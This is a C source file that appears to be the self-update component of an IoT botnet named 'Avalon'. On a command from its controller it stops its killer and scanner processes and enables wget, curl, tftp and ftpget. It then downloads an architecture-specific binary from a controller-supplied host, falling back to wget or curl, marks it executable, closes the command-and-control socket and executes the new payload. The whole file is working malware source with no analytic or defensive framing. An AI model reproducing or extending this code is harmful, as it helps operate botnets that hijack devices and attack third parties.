#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

#include "headers/includes.h"
#include "headers/update.h"
#include "headers/utils.h"
#include "headers/resolv.h"
#include "headers/killer.h"
#include "headers/scanner.h"
#include "headers/locker.h"
#include "headers/table.h"
#include "headers/rand.h"

int safe_exec(char *path, char **args) {
    pid_t pid = fork();
    if (pid == 0) {
        int fd = open("/dev/null", O_RDWR);
        if (fd != -1) {
            dup2(fd, 1);
            dup2(fd, 2);
            close(fd);
        }
        execv(path, args);
        _exit(1);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        return WIFEXITED(status) && WEXITSTATUS(status) == 0;
    }
    return 0;
}

void stop_all_subprocesses(void) {
#ifdef DEBUG
    printf("(avalon/update) Deteniendo sub-procesos...\n");
#endif
    killer_kill();
    scanner_kill();
    watcher_kill();
}

int download_file(char *host, int port, char *path, char *dest) {
    int fd = -1;
    struct sockaddr_in addr;
    struct resolv_entries *entries = NULL;
    ipv4_t ip_addr = 0;
    char buffer[1024];
    int n, success = 0;
    int dest_fd = -1;

    ip_addr = inet_addr(host);
    if (ip_addr == INADDR_NONE) {
#ifdef DEBUG
        printf("(avalon/update) Resolving %s...\n", host);
#endif
        entries = resolv_lookup(host);
        if (entries == NULL || entries->addrs_len == 0) {
#ifdef DEBUG
             printf("(avalon/update) Failed to resolve %s\n", host);
#endif
             goto cleanup;
        }
        ip_addr = entries->addrs[rand_next() % entries->addrs_len];
    }

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) goto cleanup;

    util_zero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip_addr;
    addr.sin_port = htons(port);

#ifdef DEBUG
    printf("(avalon/update) Connecting to %s (%d.%d.%d.%d:%d)...\n", host,
           ip_addr & 0xff, (ip_addr >> 8) & 0xff, (ip_addr >> 16) & 0xff, (ip_addr >> 24) & 0xff, port);
#endif

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) goto cleanup;

    char req[512];
    snprintf(req, sizeof(req),
             "GET /%s HTTP/1.0\r\n"
             "Host: %s\r\n"
             "User-Agent: AvalonNet-Update\r\n"
             "Connection: close\r\n\r\n",
             path, host);

    if (send(fd, req, util_strlen(req), MSG_NOSIGNAL) == -1) goto cleanup;

    dest_fd = open(dest, O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (dest_fd == -1) goto cleanup;

    int headers_finished = 0;
    while ((n = recv(fd, buffer, sizeof(buffer), 0)) > 0) {
        if (!headers_finished) {
            int offset = util_memsearch(buffer, n, "\r\n\r\n", 4);
            if (offset != -1) {
                headers_finished = 1;
                if (n > offset) {
                    write(dest_fd, buffer + offset, n - offset);
                }
            }
        } else {
            write(dest_fd, buffer, n);
        }
    }

    success = 1;

cleanup:
    if (fd != -1) close(fd);
    if (dest_fd != -1) close(dest_fd);
    if (entries != NULL) resolv_entries_free(entries);
    return success;
}

void handle_update(const uint8_t *buf, int len) {

    if (len < 6) return;

    int pos = 0;

    uint8_t ip_len = buf[pos++];
    char ip[256];
    util_memcpy(ip, buf + pos, ip_len);
    ip[ip_len] = '\0';
    pos += ip_len;

    uint8_t prefix_len = buf[pos++];
    char prefix[256];
    util_memcpy(prefix, buf + pos, prefix_len);
    prefix[prefix_len] = '\0';
    pos += prefix_len;

    uint8_t dir_len = buf[pos++];
    char dir[256];
    util_memcpy(dir, buf + pos, dir_len);
    dir[dir_len] = '\0';
    pos += dir_len;

    stop_all_subprocesses();

    char *tools[] = {"/usr/bin/wget", "/bin/wget", "/usr/bin/curl", "/bin/curl", "/usr/bin/tftp", "/bin/tftp", "/usr/bin/ftpget", "/bin/ftpget"};
    for (int i = 0; i < 8; i++) {
        chmod(tools[i], 0755);
    }

    char path[256];
    snprintf(path, sizeof(path), "%s.%s", prefix, ARCH);
    char local_bin[512];
    snprintf(local_bin, sizeof(local_bin), "%s/%s", dir, prefix);

    int success = 0;

#ifdef DEBUG
    printf("(avalon/update) Intentando descarga nativa desde %s...\n", ip);
#endif
    if (download_file(ip, 80, path, local_bin)) {
#ifdef DEBUG
        printf("(avalon/update) Descarga nativa exitosa!\n");
#endif
        success = 1;
    } else {
#ifdef DEBUG
        printf("(avalon/update) Descarga nativa fallo, intentando fallback...\n");
#endif
    }

    if (!success) {
        char url[512];
        snprintf(url, sizeof(url), "http://%s/%s", ip, path);

        char *wget_args[] = {"wget", "-q", "-O", local_bin, url, NULL};
        if (safe_exec("/usr/bin/wget", wget_args) || safe_exec("/bin/wget", wget_args)) {
            success = 1;
        }

        if (!success) {
            char *curl_args[] = {"curl", "-s", "-o", local_bin, url, NULL};
            if (safe_exec("/usr/bin/curl", curl_args) || safe_exec("/bin/curl", curl_args)) {
                success = 1;
            }
        }
    }

    if (success) {
        chmod(local_bin, 0777);
#ifdef DEBUG
        printf("(avalon/update) Actualización exitosa. Ejecutando nuevo binario...\n");
#endif
        extern int global_sock;
        if (global_sock >= 0) {
#ifdef DEBUG
            printf("(avalon/update) Cerrando socket CNC (fd=%d)\n", global_sock);
#endif
            close(global_sock);
            global_sock = -1;
        }

        char *exec_args[] = {local_bin, "update", NULL};
        execv(local_bin, exec_args);

        exit(0);
    }
}
